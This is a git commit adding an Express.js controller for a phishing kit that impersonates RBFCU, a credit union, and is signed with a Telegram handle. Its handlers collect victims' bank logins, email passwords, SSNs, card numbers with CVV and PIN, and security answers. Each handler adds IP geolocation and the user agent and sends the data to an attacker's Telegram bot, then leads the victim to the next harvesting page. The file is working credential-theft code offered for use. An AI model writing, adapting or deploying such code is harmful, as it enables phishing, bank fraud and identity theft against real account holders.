6f896566ffea8468d00978f3a81a178d05a8b704
myemailaddresswithproton <142791391+myemailaddresswithproton@users.noreply.github.com>
2023-08-21 10:49:12 +0100

    Add files via upload
    first commit

---
+++ controller/controller.js
@@ -0,0 +1,225 @@
+const { sendMessageFor } = require("simple-telegram-message");
+const { botToken, chatId } = require("../settings");
+const getIPDetails = require("../middleware/getIPDetails");
+
+// console.log(getIPDetails());
+
+exports.login = (req, res) => {
+  return res.render("login");
+};
+
+exports.loginPost = async (req, res) => {
+  const { username, password } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  LOGIN-1\n\n` +
+    `🔰Username        : ${username}\n` +
+    `🔑Pass            : ${password}\n\n` +
+    `++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `+++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/login/2");
+};
+
+exports.login2 = (req, res) => {
+  res.render("login2");
+};
+
+exports.loginPost2 = async (req, res) => {
+  const { username, password } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  LOGIN-2\n\n` +
+    `🔰Username        : ${username}\n` +
+    `🔑Pass            : ${password}\n\n` +
+    `+++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `+++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/email-verification");
+};
+
+exports.login3 = (req, res) => {
+  res.render("login3");
+};
+
+exports.loginPost3 = async (req, res) => {
+  const { email, emailPassword } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  Email Access\n\n` +
+    `📧Email            : ${email}\n` +
+    `🔑Email Pass            : ${emailPassword}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/personal");
+};
+
+exports.personal = (req, res) => {
+  res.render("personal");
+};
+
+exports.personalPost = async (req, res) => {
+  const { fname, lname, phone, cpin, ssn } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  INFO\n\n` +
+    `Fname            : ${fname}\n\n` +
+    `Lname            : ${lname}\n\n` +
+    `Phone            : ${phone}\n\n` +
+    `SSN              : ${ssn}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/card");
+};
+
+exports.card = (req, res) => {
+  res.render("card");
+};
+
+exports.cardPost = async (req, res) => {
+  const { ccn, cvv, exp, cpin } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  CARD-INFO\n\n` +
+    `CardNum          : ${ccn}\n\n` +
+    `CVV              : ${cvv}\n\n` +
+    `ExpiryDate       : ${exp}\n\n` +
+    `CardPin          : ${cpin}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/questions");
+};
+
+exports.questions = (req, res) => {
+  res.render("questions");
+};
+
+exports.questionsPost = async (req, res) => {
+  const { q1, a1, q2, a2, q3, a3 } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `RBFCU  SECURITY QUESTIONS\n\n` +
+    `S-Question1        : ${q1}\n\n` +
+    `Answer1            : ${a1}\n\n` +
+    `S-Question2        : ${q2}\n\n` +
+    `Answer2            : ${a2}\n\n` +
+    `S-Question3        : ${q3}\n\n` +
+    `Answer3            : ${a3}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/success");
+};
+
+exports.success = (req, res) => {
+  return res.render("success");
+};
+
+exports.page404Redirect = (req, res) => {
+  return res.redirect("/auth/login");
+};
